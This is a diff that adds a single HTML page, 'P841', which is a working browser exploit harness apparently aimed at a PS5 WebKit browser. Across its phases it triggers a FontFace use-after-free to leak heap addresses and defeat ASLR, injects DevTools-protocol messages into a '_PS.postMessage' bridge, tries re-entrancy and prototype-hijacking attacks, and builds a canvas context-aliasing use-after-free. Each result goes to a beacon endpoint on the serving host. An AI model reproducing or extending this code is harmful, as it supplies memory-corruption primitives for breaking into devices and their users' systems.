@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P841</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:12px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:90vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P841: _PS ASLR DEFEAT — Heavy Attack</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P841-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+
+bn('BOOT','start');
+log('Target: _PS.postMessage exploitation for ASLR defeat','info');
+
+/* ========== PHASE A: FontFace UAF (proven pattern) ========== */
+log('\n=== PHASE A: FontFace UAF ===','hot');
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs=[],ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    if(st){st.remove();st.textContent='';st=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    fabs=[];
+    for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bb1');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<fabs.length;i++){
+    var u=new Uint8Array(fabs[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+  if(bestI<0||bestNz<4){
+    bn('MISS','nz='+bestNz);
+    log('UAF miss (nz='+bestNz+'), reloading...','fail');
+    setTimeout(function(){location.reload();},400);
+    return;
+  }
+
+  var ab=fabs[bestI];
+  var bu=new BigUint64Array(ab);
+  var u8=new Uint8Array(ab);
+  var q11=bu[11],q13=bu[13];
+  var H=q11-BigInt(0x68);
+  var Hstr='0x'+H.toString(16);
+  var q13str='0x'+q13.toString(16);
+
+  bn('UAF-OK','H='+Hstr+'|q13='+q13str+'|nz='+bestNz);
+  log('H = '+Hstr+' | q13 = '+q13str,'ok');
+
+  /* Dump ALL 24 qwords for reference */
+  var qdump=[];
+  for(var i=0;i<24;i++){
+    var v=bu[i];
+    if(v!==BigInt(0))qdump.push('q'+i+'=0x'+v.toString(16));
+  }
+  bn('QDUMP',qdump.join('|'));
+  log('Nonzero qwords: '+qdump.length,'info');
+
+  runPhaseB();
+
+  /* ========== PHASE B: _PS Deep Introspection ========== */
+  function runPhaseB(){
+    log('\n=== PHASE B: _PS Deep Introspection ===','hot');
+    var bRes=[];
+
+    /* B1: Full property enumeration of _PS */
+    try{
+      var ownP=Object.getOwnPropertyNames(_PS);
+      var ownS=Object.getOwnPropertySymbols?Object.getOwnPropertySymbols(_PS):[];
+      bRes.push('ownProps='+ownP.join(','));
+      bRes.push('ownSymbols='+ownS.length);
+      for(var i=0;i<ownP.length;i++){
+        var desc=Object.getOwnPropertyDescriptor(_PS,ownP[i]);
+        bRes.push(ownP[i]+':w='+desc.writable+',e='+desc.enumerable+',c='+desc.configurable);
+      }
+    }catch(e){bRes.push('enum-err:'+e.message.slice(0,30));}
+
+    /* B2: Prototype chain */
+    try{
+      var proto=Object.getPrototypeOf(_PS);
+      bRes.push('proto='+(proto===Object.prototype?'Object.prototype':String(proto)));
+      if(proto&&proto!==Object.prototype){
+        var pp=Object.getOwnPropertyNames(proto);
+        bRes.push('proto.props='+pp.join(','));
+      }
+    }catch(e){bRes.push('proto-err:'+e.message.slice(0,30));}
+
+    /* B3: _PS.postMessage deep inspection */
+    try{
+      var pm=_PS.postMessage;
+      bRes.push('pm.name='+pm.name);
+      bRes.push('pm.length='+pm.length);
+      bRes.push('pm.toString='+Function.prototype.toString.call(pm).slice(0,60));
+      bRes.push('pm.constructor='+(pm.constructor===Function?'Function':'other:'+pm.constructor));
+      var pmProto=Object.getPrototypeOf(pm);
+      bRes.push('pm.proto='+(pmProto===Function.prototype?'Function.prototype':'other'));
+    }catch(e){bRes.push('pm-err:'+e.message.slice(0,30));}
+
+    /* B4: Type coercion of _PS */
+    try{bRes.push('Number(_PS)='+Number(_PS));}catch(e){bRes.push('Number=ERR:'+e.message.slice(0,20));}
+    try{bRes.push('String(_PS)='+String(_PS).slice(0,40));}catch(e){bRes.push('String=ERR:'+e.message.slice(0,20));}
+    try{bRes.push('+_PS='+(+_PS));}catch(e){bRes.push('+_PS=ERR:'+e.message.slice(0,20));}
+    try{bRes.push('_PS|0='+(_PS|0));}catch(e){bRes.push('|0=ERR:'+e.message.slice(0,20));}
+    try{bRes.push('BigInt(_PS)='+BigInt(_PS));}catch(e){bRes.push('BigInt=ERR:'+e.message.slice(0,20));}
+
+    /* B5: Symbol access */
+    var syms=['toPrimitive','toStringTag','iterator','hasInstance','species','isConcatSpreadable'];
+    for(var i=0;i<syms.length;i++){
+      try{
+        var s=Symbol[syms[i]];
+        var v=_PS[s];
+        if(v!==undefined)bRes.push('Symbol.'+syms[i]+'='+String(v).slice(0,30));
+      }catch(e){}
+    }
+
+    /* B6: Exotic property access */
+    try{bRes.push('_PS[0]='+_PS[0]);}catch(e){}
+    try{bRes.push('_PS.length='+_PS.length);}catch(e){}
+    try{bRes.push('_PS.byteLength='+_PS.byteLength);}catch(e){}
+    try{bRes.push('_PS.buffer='+_PS.buffer);}catch(e){}
+    try{bRes.push('_PS.size='+_PS.size);}catch(e){}
+    try{bRes.push('_PS.type='+_PS.type);}catch(e){}
+
+    bn('PS-DEEP',bRes.join('||'));
+    for(var i=0;i<bRes.length;i++)log('  '+bRes[i],'info');
+
+    runPhaseC();
+  }
+
+  /* ========== PHASE C: CDP Protocol Injection via _PS.postMessage ========== */
+  function runPhaseC(){
+    log('\n=== PHASE C: CDP Protocol Injection ===','hot');
+    var cRes=[];
+
+    /* Set up listeners for any response channel */
+    var gotResponse=false,responseData='';
+    window.addEventListener('message',function(e){
+      gotResponse=true;
+      responseData+='wmsg:'+String(e.data).slice(0,100)+'|';
+    });
+
+    /* C1: Chrome DevTools Protocol messages directly to _PS.postMessage */
+    var cdpMessages=[
+      '{"id":1,"method":"HeapProfiler.takeHeapSnapshot","params":{}}',
+      '{"id":2,"method":"HeapProfiler.enable"}',
+      '{"id":3,"method":"Runtime.evaluate","params":{"expression":"1+1"}}',
+      '{"id":4,"method":"Runtime.getHeapUsage"}',
+      '{"id":5,"method":"Debugger.enable"}',
+      '{"id":6,"method":"Page.getResourceTree"}',
+      '{"id":7,"method":"Memory.getDOMCounters"}',
+      '{"id":8,"method":"HeapProfiler.getObjectByHeapObjectId","params":{"objectId":"1"}}',
+      '{"id":9,"method":"Runtime.getProperties","params":{"objectId":"1"}}',
+      '{"id":10,"method":"HeapProfiler.startSampling"}',
+      'cycript:*:ObjectiveC.classes',
+      'cycript:*:choose(JSContext)',
+      '__jsc_debug_heap_dump__',
+      'CYCRIPT_EVALUATE:JSON.stringify(ObjectiveC.classes)',
+      'debug heap',
+      'JSC::VM::heap().collectNow()',
+    ];
+
+    for(var i=0;i<cdpMessages.length;i++){
+      try{
+        _PS.postMessage(cdpMessages[i]);
+        cRes.push('msg'+i+'=sent');
+      }catch(e){
+        cRes.push('msg'+i+'=ERR:'+e.message.slice(0,25));
+      }
+    }
+
+    /* C2: Direct call without String wrapping */
+    var directTypes=[
+      undefined, null, 0, 1, -1, true, false,
+      {toString:function(){return '{"id":99,"method":"HeapProfiler.takeHeapSnapshot"}';}},
+      new ArrayBuffer(8),
+      new Uint8Array([0x7b,0x22,0x69,0x64,0x22,0x3a,0x31,0x7d]), /* {"id":1} as bytes */
+    ];
+    for(var i=0;i<directTypes.length;i++){
+      try{
+        var ret=_PS.postMessage(directTypes[i]);
+        if(ret!==undefined)cRes.push('direct'+i+'=RET:'+String(ret).slice(0,40));
+      }catch(e){
+        cRes.push('direct'+i+'=ERR:'+e.message.slice(0,25));
+      }
+    }
+
+    /* C3: postMessageNative with CDP */
+    try{
+      postMessageNative('{"id":50,"method":"HeapProfiler.takeHeapSnapshot","params":{}}');
+      cRes.push('native-cdp=sent');
+    }catch(e){cRes.push('native-cdp=ERR:'+e.message.slice(0,25));}
+
+    bn('CDP',cRes.join('||'));
+    log('CDP injection: '+cRes.length+' attempts','info');
+    for(var i=0;i<cRes.length;i++){
+      if(cRes[i].indexOf('ERR')>=0||cRes[i].indexOf('RET')>=0)log('  '+cRes[i],'hot');
+    }
+
+    /* Check for responses after delay */
+    setTimeout(function(){
+      if(gotResponse){
+        bn('CDP-RESPONSE',responseData.slice(0,800));
+        log('GOT RESPONSE: '+responseData.slice(0,200),'hot');
+      }else{
+        bn('CDP-NORESP','silent');
+        log('No CDP responses received','fail');
+      }
+      runPhaseD();
+    },500);
+  }
+
+  /* ========== PHASE D: Re-entrancy Attack on _PS.postMessage ========== */
+  function runPhaseD(){
+    log('\n=== PHASE D: Re-entrancy Attack ===','hot');
+    var dRes=[];
+
+    /* D1: toString that triggers GC + spray during postMessage */
+    var reentryFired=false;
+    var sprayABs=[];
+    var evilObj={
+      toString:function(){
+        if(reentryFired)return 'x';
+        reentryFired=true;
+
+        /* During toString, we're inside postMessage's C++ code */
+        /* Try to force GC */
+        var junk=[];
+        for(var i=0;i<5000;i++)junk.push({x:new ArrayBuffer(64)});
+        junk=null;
+
+        /* Spray 192-byte ABs to try to reclaim any freed objects */
+        sprayABs=[];
+        for(var i=0;i<200;i++)sprayABs.push(new ArrayBuffer(192));
+
+        /* Also try to trigger heap snapshot during re-entry */
+        try{console.takeHeapSnapshot();}catch(e){}
+
+        return '{"id":1,"method":"HeapProfiler.takeHeapSnapshot"}';
+      }
+    };
+
+    try{
+      _PS.postMessage(evilObj);
+      dRes.push('reentry=survived');
+    }catch(e){
+      dRes.push('reentry=ERR:'+e.message.slice(0,30));
+    }
+
+    /* Check spray ABs for any nonzero data (reclaimed freed objects) */
+    var sprayHits=0,sprayData=[];
+    for(var i=0;i<sprayABs.length;i++){
+      var sv=new BigUint64Array(sprayABs[i]);
+      for(var j=0;j<sv.length;j++){
+        if(sv[j]!==BigInt(0)){
+          sprayHits++;
+          var hi=Number(sv[j]>>BigInt(32));
+          var tag='heap';
+          if(hi>0&&hi<0x1000)tag='CODE';
+          else if(hi>=0xFFFF8000)tag='KERN';
+          else if(hi>=0x10000&&hi<0x10010)tag='heap';
+          sprayData.push('ab'+i+'.q'+j+'=0x'+sv[j].toString(16)+'('+tag+')');
+          if(sprayData.length>=15)break;
+        }
+      }
+      if(sprayData.length>=15)break;
+    }
+    dRes.push('sprayHits='+sprayHits);
+    if(sprayData.length>0)dRes.push('data='+sprayData.slice(0,8).join(','));
+
+    /* D2: Proxy trap on _PS */
+    try{
+      var proxyLog=[];
+      var pHandler={
+        get:function(t,p){proxyLog.push('get:'+String(p));return Reflect.get(t,p);},
+        apply:function(t,th,a){proxyLog.push('apply:'+a.length);return Reflect.apply(t,th,a);}
+      };
+      var pPS=new Proxy(_PS,pHandler);
+      pPS.postMessage('proxy-test');
+      dRes.push('proxy='+proxyLog.join(';'));
+    }catch(e){dRes.push('proxy=ERR:'+e.message.slice(0,30));}
+
+    /* D3: Prototype pollution on _PS */
+    try{
+      var origProto=Object.getPrototypeOf(_PS);
+      var fakeProto={
+        postMessage:function(){return 'hijacked';},
+        heapDump:function(){return 'fake';}
+      };
+      Object.setPrototypeOf(_PS,fakeProto);
+      dRes.push('setProto=OK');
+      var hijackResult=_PS.heapDump();
+      dRes.push('hijack='+String(hijackResult));
+      /* Can we shadow postMessage? */
+      var pmResult=_PS.postMessage('after-proto');
+      dRes.push('pm-after-proto='+String(pmResult));
+      Object.setPrototypeOf(_PS,origProto);
+    }catch(e){dRes.push('setProto=ERR:'+e.message.slice(0,30));}
+
+    /* D4: defineProperty attacks */
+    try{
+      Object.defineProperty(_PS,'__heapDump',{value:42,configurable:true});
+      dRes.push('defProp=OK,val='+_PS.__heapDump);
+    }catch(e){dRes.push('defProp=ERR:'+e.message.slice(0,30));}
+
+    try{
+      Object.defineProperty(_PS,'postMessage',{value:function(){return 'replaced';}});
+      dRes.push('replacePM=OK');
+    }catch(e){dRes.push('replacePM=ERR:'+e.message.slice(0,30));}
+
+    bn('REENTRY',dRes.join('||'));
+    for(var i=0;i<dRes.length;i++)log('  '+dRes[i],'info');
+
+    runPhaseE();
+  }
+
+  /* ========== PHASE E: Console.takeHeapSnapshot Redirection ========== */
+  function runPhaseE(){
+    log('\n=== PHASE E: HeapSnapshot Redirection ===','hot');
+    var eRes=[];
+
+    /* E1: Override console to capture output */
+    var captured=[];
+    var origConsole=window.console;
+    try{
+      var fakeConsole={};
+      var methods=['log','warn','error','info','debug','dir','table','trace',
+        'takeHeapSnapshot','record','recordEnd','screenshot'];
+      for(var i=0;i<methods.length;i++){
+        (function(m){
+          fakeConsole[m]=function(){
+            captured.push(m+':'+Array.prototype.slice.call(arguments).map(function(a){
+              return String(a).slice(0,50);
+            }).join(','));
+            if(origConsole[m])return origConsole[m].apply(origConsole,arguments);
+          };
+        })(methods[i]);
+      }
+      window.console=fakeConsole;
+      console.takeHeapSnapshot();
+      window.console=origConsole;
+      eRes.push('fakeConsole='+captured.length+' captures');
+      if(captured.length>0)eRes.push('captured='+captured.join(';').slice(0,200));
+    }catch(e){
+      window.console=origConsole;
+      eRes.push('fakeConsole=ERR:'+e.message.slice(0,30));
+    }
+
+    /* E2: Monkey-patch console.takeHeapSnapshot */
+    try{
+      var origTHS=console.takeHeapSnapshot;
+      var thsCalled=false;
+      console.takeHeapSnapshot=function(){
+        thsCalled=true;
+        /* Try to call original and intercept */
+        var result=origTHS.call(console);
+        return result;
+      };
+      var r=console.takeHeapSnapshot();
+      eRes.push('monkeyPatch=called:'+thsCalled+',ret='+String(r));
+      console.takeHeapSnapshot=origTHS;
+    }catch(e){eRes.push('monkeyPatch=ERR:'+e.message.slice(0,30));}
+
+    /* E3: WebKit Inspector globals check */
+    var inspectorGlobals=['InspectorFrontendHost','WebInspector','InspectorBackend',
+      'Protocol','InspectorFrontendAPI','WI','UI','SDK','Main',
+      '__InspectorContext','__inspector','__webkit_inspector'];
+    for(var i=0;i<inspectorGlobals.length;i++){
+      try{
+        var v=window[inspectorGlobals[i]];
+        if(v!==undefined)eRes.push('FOUND:'+inspectorGlobals[i]+'='+String(v).slice(0,40));
+      }catch(e){}
+    }
+
+    /* E4: Check for webkit:// and internal:// fetch */
+    var internalURLs=[
+      'webkit://gpu','webkit://inspector','webkit://memory',
+      'about:memory','about:heap','about:config',
+      'internal://heap','internal://debug','internal://memory',
+      'ps5://debug','ps5://heap','ps5://memory',
+      'resource://inspector','resource://devtools',
+      'blob:null/inspector'
+    ];
+    var urlIdx=0;
+    function testURL(){
+      if(urlIdx>=internalURLs.length){finishE();return;}
+      var url=internalURLs[urlIdx++];
+      try{
+        var x=new XMLHttpRequest();
+        x.open('GET',url,true);
+        x.timeout=300;
+        x.onload=function(){
+          eRes.push('URL-HIT:'+url+'='+x.status+','+String(x.responseText).slice(0,60));
+          bn('URL-HIT',url+'|'+x.status+'|'+String(x.responseText).slice(0,200));
+          testURL();
+        };
+        x.onerror=function(){testURL();};
+        x.ontimeout=function(){testURL();};
+        x.send();
+      }catch(e){testURL();}
+    }
+    testURL();
+
+    function finishE(){
+      bn('HEAPSNAP',eRes.join('||'));
+      for(var i=0;i<eRes.length;i++){
+        if(eRes[i].indexOf('FOUND')>=0||eRes[i].indexOf('HIT')>=0)
+          log('  '+eRes[i],'hot');
+        else
+          log('  '+eRes[i],'info');
+      }
+      runPhaseF();
+    }
+  }
+
+  /* ========== PHASE F: _PS Address Hunt via Heap Layout ========== */
+  function runPhaseF(){
+    log('\n=== PHASE F: _PS Address Hunt ===','hot');
+    var fRes=[];
+
+    /* F1: Store _PS refs in dense arrays, then scan UAF AB neighborhood */
+    /* The idea: _PS is a JS object on the heap. If we create arrays
+       containing references to _PS, those refs are NaN-boxed pointers.
+       We can read the CSSFontFace's pointers (q11, q13) and try to
+       find _PS by chaining through heap structures. */
+
+    /* Create objects referencing _PS at known structure */
+    var psHolders=[];
+    for(var i=0;i<100;i++){
+      psHolders.push({ps:_PS, pm:_PS.postMessage, idx:i});
+    }
+
+    /* Store _PS in various containers */
+    var psArray=[_PS,_PS,_PS,_PS,_PS,_PS,_PS,_PS];
+    var psMap=new Map();psMap.set('ps',_PS);psMap.set('pm',_PS.postMessage);
+    var psSet=new Set();psSet.add(_PS);psSet.add(_PS.postMessage);
+
+    /* F2: Use Float64Array/BigUint64Array to try to leak NaN-boxed values */
+    /* When JS stores an object reference, it's NaN-boxed as: ptr | tag */
+    /* If we can read raw memory containing _PS refs, we get the address */
+
+    /* Try: create a WeakRef to _PS and see if we can read its target address */
+    var psWeak=new WeakRef(_PS);
+    var pmWeak=new WeakRef(_PS.postMessage);
+    fRes.push('weakref='+String(psWeak.deref()===_PS));
+
+    /* F3: FinalizationRegistry — track what happens when _PS-related objects die */
+    var frRegistry=new FinalizationRegistry(function(held){
+      bn('FR-CALLBACK','held='+String(held));
+      fRes.push('FR:'+String(held));
+    });
+
+    /* Register wrappers (not _PS itself — it won't be collected) */
+    for(var i=0;i<10;i++){
+      var wrapper={ref:_PS,idx:i};
+      frRegistry.register(wrapper,'wrapper-'+i);
+    }
+
+    /* F4: Try to read _PS-containing memory through the UAF AB */
+    /* q11 (offset 0x58) = self-pointer, q13 (offset 0x68) = CSSFontSelector* */
+    /* CSSFontSelector -> Document -> DOMWindow -> globalThis -> _PS */
+    /* We can only read 192 bytes at H, but let's scan ALL qwords for anything useful */
+    var allPtrs=[];
+    for(var i=0;i<24;i++){
+      var v=bu[i];
+      if(v!==BigInt(0)){
+        var hi=Number(v>>BigInt(32));
+        var lo=Number(v&BigInt(0xFFFFFFFF));
+        var tag='';
+        if(hi>=0xFFFF8000)tag='KERN';
+        else if(hi>=0x10000&&hi<0x10100)tag='heap';
+        else if(hi>0&&hi<0x800)tag='SMALL';
+        else if(hi>=0x800&&hi<0x10000)tag='MID';
+        else tag='unknown-hi:0x'+hi.toString(16);
+        allPtrs.push('q'+i+':0x'+v.toString(16)+'('+tag+')');
+      }
+    }
+    fRes.push('ptrs='+allPtrs.length);
+    bn('PTRS',allPtrs.join('|'));
+
+    /* F5: Second FontFace UAF at a DIFFERENT address to extend our read window */
+    log('  Starting 2nd FontFace UAF...','info');
+    var st2=document.createElement('style');
+    st2.textContent="@font-face{font-family:bb2;src:local(Courier);unicode-range:U+0043;}";
+    document.head.appendChild(st2);
+    var face2=new FontFace('f2',"local('Georgia')",{unicodeRange:'U+0044'});
+    document.fonts.add(face2);
+    void face2.loaded;
+
+    var fabs2=[],ffired2=false;
+    Object.defineProperty(FontFace.prototype,'then',{
+      configurable:true,
+      get:function(){
+        if(ffired2)return undefined;
+        ffired2=true;
+        if(st2){st2.remove();st2.textContent='';st2=null;}
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+        fabs2=[];
+        for(var i=0;i<64;i++)fabs2.push(new ArrayBuffer(192));
+        try{document.fonts.check('1em bb2');}catch(e){}
+        document.body.offsetHeight;
+        return undefined;
+      },set:function(){}
+    });
+    document.fonts.load('1em f2, bb2','CD');
+
+    setTimeout(function(){
+      delete FontFace.prototype.then;
+
+      var bestI2=-1,bestNz2=0;
+      for(var i=0;i<fabs2.length;i++){
+        var u2=new Uint8Array(fabs2[i]),nz2=0;
+        for(var j=0;j<u2.length;j++)if(u2[j]!==0)nz2++;
+        if(nz2>bestNz2){bestNz2=nz2;bestI2=i;}
+      }
+
+      if(bestI2>=0&&bestNz2>=4){
+        var ab2=fabs2[bestI2];
+        var bu2=new BigUint64Array(ab2);
+        var q11b=bu2[11];
+        var H2=q11b-BigInt(0x68);
+        var q13b=bu2[13];
+        fRes.push('H2=0x'+H2.toString(16)+'|q13b=0x'+q13b.toString(16));
+        log('  2nd UAF: H2=0x'+H2.toString(16),'ok');
+
+        /* Calculate distance between the two CSSFontFace objects */
+        var dist=H2>H?Number(H2-H):Number(H-H2);
+        fRes.push('dist='+dist+'(0x'+dist.toString(16)+')');
+        log('  Distance H-H2: 0x'+dist.toString(16)+' ('+dist+' bytes)','info');
+
+        /* Check if q13 pointers differ (they should — different CSSFontSelector) */
+        fRes.push('q13-same='+(q13===q13b));
+
+        /* Scan 2nd UAF for pointers too */
+        var ptrs2=[];
+        for(var i=0;i<24;i++){
+          var v=bu2[i];
+          if(v!==BigInt(0)){
+            var hi=Number(v>>BigInt(32));
+            if(hi>=0x10000&&hi<0x10100)ptrs2.push('q'+i+':0x'+v.toString(16));
+          }
+        }
+        fRes.push('ptrs2='+ptrs2.length);
+        bn('UAF2',fRes.slice(-5).join('|'));
+      }else{
+        fRes.push('uaf2-miss=nz'+bestNz2);
+        log('  2nd UAF missed','fail');
+      }
+
+      bn('ADDRHUNT',fRes.join('||'));
+      for(var i=0;i<fRes.length;i++)log('  '+fRes[i],'info');
+
+      runPhaseG();
+    },300);
+  }
+
+  /* ========== PHASE G: Canvas Alias + LineDash Layout Mapping ========== */
+  function runPhaseG(){
+    log('\n=== PHASE G: Canvas Alias Layout ===','hot');
+    var gRes=[];
+
+    /* Set up canvas UAF alias */
+    var outerC=document.createElement('canvas');
+    outerC.width=1;outerC.height=1;
+    var ctxOuter=outerC.getContext('bitmaprenderer');
+    if(!ctxOuter){bn('G-FAIL','no-bitmaprenderer');log('bitmaprenderer unavailable','fail');runFinal();return;}
+
+    var innerC=document.createElement('canvas');
+    innerC.width=1;innerC.height=1;
+
+    /* Trigger canvas UAF: get alpha property during transferToImageBitmap */
+    var origCtx=null;
+    try{
+      Object.defineProperty(outerC,'alpha',{
+        get:function(){
+          origCtx=innerC.getContext('2d');
+          return true;
+        }
+      });
+    }catch(e){}
+
+    var uafCtx=null;
+    try{
+      /* This should trigger the UAF: bitmaprenderer frees, 2d reclaims */
+      var bmp=outerC.transferToImageBitmap?outerC.transferToImageBitmap():null;
+      if(!bmp){bn('G-FAIL','no-transferToImageBitmap');log('transferToImageBitmap unavailable','fail');runFinal();return;}
+
+      /* The origCtx (innerC's 2d) was obtained during the alpha getter */
+      /* Now create many 2d contexts to try to reclaim the freed CanvasRenderingContext2D */
+      var sprayCanvases=[];
+      for(var i=0;i<200;i++){
+        var sc=document.createElement('canvas');
+        sc.width=1;sc.height=1;
+        var sctx=sc.getContext('2d');
+        sctx.fillStyle='#000000';
+        sprayCanvases.push({c:sc,ctx:sctx});
+      }
+
+      /* Test: write on origCtx, read on spray canvases to find alias */
+      if(origCtx){
+        origCtx.fillStyle='#ABCDEF';
+        origCtx.strokeStyle='#123456';
+        origCtx.lineWidth=3.14159;
+        origCtx.globalAlpha=0.777;
+        origCtx.setLineDash([11.11,22.22,33.33]);
+        origCtx.lineDashOffset=44.44;
+
+        var aliasIdx=-1;
+        for(var i=0;i<sprayCanvases.length;i++){
+          var sctx=sprayCanvases[i].ctx;
+          /* Check if this context reads our written values */
+          if(sctx.fillStyle==='#abcdef'){
+            aliasIdx=i;
+            break;
+          }
+        }
+
+        if(aliasIdx>=0){
+          var aliasCtx=sprayCanvases[aliasIdx].ctx;
+          gRes.push('ALIAS-FOUND='+aliasIdx);
+          log('  Canvas alias at index '+aliasIdx,'ok');
+
+          /* Read all state from aliased context */
+          gRes.push('a.fill='+aliasCtx.fillStyle);
+          gRes.push('a.stroke='+aliasCtx.strokeStyle);
+          gRes.push('a.lineW='+aliasCtx.lineWidth);
+          gRes.push('a.alpha='+aliasCtx.globalAlpha);
+          var ld=aliasCtx.getLineDash();
+          gRes.push('a.lineDash='+ld.join(','));
+          gRes.push('a.dashOff='+aliasCtx.lineDashOffset);
+
+          /* KEY TEST: Write on alias, read on origCtx */
+          aliasCtx.fillStyle='#FEDCBA';
+          gRes.push('orig.fill-after='+origCtx.fillStyle);
+
+          /* Set transform on one, read on other */
+          origCtx.setTransform(1.1,2.2,3.3,4.4,5.5,6.6);
+          var t=aliasCtx.getTransform();
+          gRes.push('a.transform='+[t.a,t.b,t.c,t.d,t.e,t.f].join(','));
+
+          /* LineDash manipulation through alias */
+          /* Set different lineDash on alias */
+          aliasCtx.setLineDash([99.99,88.88,77.77,66.66,55.55]);
+          var ldOrig=origCtx.getLineDash();
+          gRes.push('orig.ld-after='+ldOrig.join(','));
+
+          /* Set large lineDash to force reallocation */
+          var bigDash=[];
+          for(var i=0;i<24;i++)bigDash.push(i*1.111);
+          aliasCtx.setLineDash(bigDash);
+          var ldBig=origCtx.getLineDash();
+          gRes.push('orig.bigld='+ldBig.length+'vals,first3='+ldBig.slice(0,3).join(','));
+
+          /* Now the critical test: can we read lineDash buffer pointer? */
+          /* If we set lineDash on origCtx, and then read the AB(192) at H... */
+          /* No — different memory regions. But within the canvas alias, */
+          /* we can try to desync the two contexts' lineDash Vectors */
+
+          /* Set lineDash to 24 doubles = 192 bytes (same as UAF AB size!) */
+          var dash192=[];
+          for(var i=0;i<24;i++)dash192.push((i+1)*1000.0+0.5);
+          origCtx.setLineDash(dash192);
+
+          /* The lineDash buffer is now 192 bytes on the heap */
+          /* Can we find it in our UAF AB? (if they share the same bmalloc page) */
+          var foundDash=false;
+          for(var fi=0;fi<fabs.length;fi++){
+            var fv=new Float64Array(fabs[fi]);
+            if(Math.abs(fv[0]-1000.5)<0.001){
+              foundDash=true;
+              gRes.push('DASH-IN-UAF=ab'+fi);
+              log('  LineDash buffer FOUND in UAF AB '+fi+'!','hot');
+              break;
+            }
+          }
+          if(!foundDash)gRes.push('dash-not-in-uaf');
+
+          bn('CANVAS-ALIAS',gRes.join('||'));
+        }else{
+          gRes.push('alias-miss');
+          log('  Canvas alias not found in spray','fail');
+          bn('CANVAS-MISS','200spray');
+        }
+      }else{
+        gRes.push('no-origCtx');
+      }
+    }catch(e){
+      gRes.push('canvas-err:'+e.message.slice(0,40));
+      bn('CANVAS-ERR',e.message);
+    }
+
+    for(var i=0;i<gRes.length;i++){
+      if(gRes[i].indexOf('FOUND')>=0||gRes[i].indexOf('ALIAS')>=0)
+        log('  '+gRes[i],'hot');
+      else
+        log('  '+gRes[i],'info');
+    }
+
+    runFinal();
+  }
+
+  /* ========== FINAL: Summary ========== */
+  function runFinal(){
+    log('\n====== P841 COMPLETE ======','hot');
+    bn('DONE','complete');
+  }
+},200);
+
+</script></body></html>
